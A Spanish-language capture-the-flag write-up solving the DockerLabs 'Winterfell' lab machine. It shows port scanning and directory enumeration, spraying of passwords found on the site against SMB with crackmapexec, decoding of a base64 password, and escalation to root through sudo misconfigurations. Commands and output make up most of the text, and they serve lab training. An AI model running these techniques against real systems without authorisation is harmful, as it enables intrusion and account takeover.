#MAQUINA #DOCKERLABS #FACIL 
#CRACKMAPEXEC #SMBMAP #SMBCLIENT 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Winterfell** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 13:14 CET
Initiating ARP Ping Scan at 13:14
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 13:14, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:14
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 445/tcp on 172.17.0.2
Discovered open port 139/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 13:14, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-09 13:14:57 CET for 0s
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** , **139(SMB)** ,**445(SMB)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80,139,445 172.17.0.2                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 13:16 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000016s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 39:f8:44:51:19:1a:a9:78:c2:21:e6:19:d3:1e:41:96 (ECDSA)
|_  256 43:9b:ac:9c:d3:0c:ad:95:44:3a:c3:fb:9e:df:3e:a2 (ED25519)
80/tcp  open  http        Apache httpd 2.4.61 ((Debian))
|_http-title: Juego de Tronos
|_http-server-header: Apache/2.4.61 (Debian)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-12-09T12:16:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.48 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 13:18 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Al revisar la web que hay en el puerto 80, vemos que es un diario.

Posible usuario -> **jon**.

Usando **gobuster** encontramos lo siguiente :

   ```bash

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,js,txt,png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1729]
/.html                (Status: 403) [Size: 275]
/dragon               (Status: 301) [Size: 309] [--> http://172.17.0.2/dragon/]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================
```

Al entrar en dragon, encontramos posibles contras para un usuario:

   ```bash
seacercaelinvierno
elcaminoreal
lordnieve
tullidosbastardosycosasrotas
elloboyelleon
unacoronadeoro
ganasomueres
porelladodelapunta
baelor
fuegoyhielo
```

Al probarlas con ssh para jon, no funcionan.

## SMB(445)

Empleamos **crackmapexec** para ver si jon y alguna contra son validos:

   ```bash

crackmapexec smb 172.17.0.2 -u jon -p contras                          
SMB         172.17.0.2      445    111D02563EA1     [*] Windows 6.1 Build 0 (name:111D02563EA1) (domain:111D02563EA1) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    111D02563EA1     [+] 111D02563EA1\jon:seacercaelinvierno 

```

Empleamos **smbmap** para tener una visión general del smb:
   ```bash
smbmap -H 172.17.0.2 -u jon -p seacercaelinvierno             

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 172.17.0.2:445  Name: pressenter.hl             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        shared                                                  READ, WRITE
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.17.12-Debian)
        jon                                                     READ ONLY       Home Directories
```

Usamos **smbclient** para acceder :

``` bash
smbclient //172.17.0.2/shared/ -U jon -p seacercaelinvierno
Password for [WORKGROUP\jon]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Dec  9 13:28:42 2024
  ..                                  D        0  Tue Jul 16 22:25:59 2024
  proteccion_del_reino                N      313  Tue Jul 16 22:26:00 2024

                229727556 blocks of size 1024. 191808500 blocks available
smb: \> cd proteccion_del_reino 
cd \proteccion_del_reino\: NT_STATUS_NOT_A_DIRECTORY
smb: \> dir
  .                                   D        0  Mon Dec  9 13:28:42 2024
  ..                                  D        0  Tue Jul 16 22:25:59 2024
  proteccion_del_reino                N      313  Tue Jul 16 22:26:00 2024

                229727556 blocks of size 1024. 191808500 blocks available
smb: \> get proteccion_del_reino 
getting file \proteccion_del_reino of size 313 as proteccion_del_reino (3130000.0 KiloBytes/sec) (average inf KiloBytes/sec)

cat proteccion_del_reino 
Aria de ti depende que los caminantes blancos no consigan pasar el muro. 
Tienes que llevar a la reina Daenerys el mensaje, solo ella sabra interpretarlo. Se encuentra cifrado en un lenguaje antiguo y dificil de entender. 
Esta es mi contraseña, se encuentra cifrada en ese lenguaje y es -> aGlqb2RlbGFuaXN0ZXI=
```

**Usuario -> jon**
**Contra -> aGlqb2RlbGFuaXN0ZXI= (base64) ->hijodelanister**

Al probarlas en ssh, estamos dentro como jon

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
jon@111d02563ea1:~$ sudo -l
Matching Defaults entries for jon on 111d02563ea1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jon may run the following commands on 111d02563ea1:
    (aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py
```

Vemos **/home/jon/.mensaje.py** con permisos SUDO al ejecutarlo con python3. De primeras no podemos editarlo, pero como es nuestro directorio podemos eliminarlo y poner otro con el contenido que queramos:

   ```bash
jon@111d02563ea1:~$ cat .mensaje.py 
import os

os.execv("/bin/bash",["-p"])
jon@111d02563ea1:~$ ls -la
total 40
drwxr-xr-x 1 jon  jon  4096 Dec  9 12:41 .
drwxr-xr-x 1 root root 4096 Jul 16 20:25 ..
-rw------- 1 jon  jon   128 Jul 17 09:16 .bash_history
-rw-r--r-- 1 jon  jon   220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 jon  jon  3526 Mar 29  2024 .bashrc
drwxr-xr-x 3 jon  jon  4096 Jul 17 09:15 .local
-rwxrwxrwx 1 jon  jon    40 Dec  9 12:41 .mensaje.py
-rw-r--r-- 1 jon  jon   807 Mar 29  2024 .profile
-rw-r--r-- 1 root root  103 Jul 16 20:26 paraJon
jon@111d02563ea1:~$ sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
aria@111d02563ea1:/home/jon$ 
```

YA ESTAMOS COMO ARIA

Vemos si el usuario tiene permisos SUDO:
   ```bash
aria@111d02563ea1:/home/jon$ sudo -l
Matching Defaults entries for aria on 111d02563ea1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User aria may run the following commands on 111d02563ea1:
    (daenerys) NOPASSWD: /usr/bin/cat, /usr/bin/ls
```

Vemos **bash** con permisos SUDO :
   ```bash
aria@111d02563ea1:/home$ sudo -u daenerys ls daenerys/
mensajeParaJon
aria@111d02563ea1:/home$ sudo -u daenerys cat daenerys/mensajeParaJon
Aria estare encantada de ayudar a Jon con la guerra en el norte, siempre y cuando despues Jon cumpla y me ayude a  recuperar el trono de hierro. 
Te dejo en este mensaje la contraseña de mi usuario por si necesitas llamar a uno de mis dragones desde tu ordenador.

!drakaris!
```

YA ESTAMOS COMO DAENERYS.

Vemos si el usuario tiene permisos SUDO:
   ```bash
daenerys@111d02563ea1:/home$ sudo -l
Matching Defaults entries for daenerys on 111d02563ea1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User daenerys may run the following commands on 111d02563ea1:
    (ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

Vemos **bash** con permisos SUDO :
   ```bash
daenerys@111d02563ea1:/home$ cat /home/daenerys/.secret/.shell.sh 
exec bash -p
daenerys@111d02563ea1:/home$ sudo -l
Matching Defaults entries for daenerys on 111d02563ea1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User daenerys may run the following commands on 111d02563ea1:
    (ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
daenerys@111d02563ea1:/home$ sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
root@111d02563ea1:/home# whoami
root
root@111d02563ea1:/home# 
```

**YA ESTAMOS COMO ROOT.**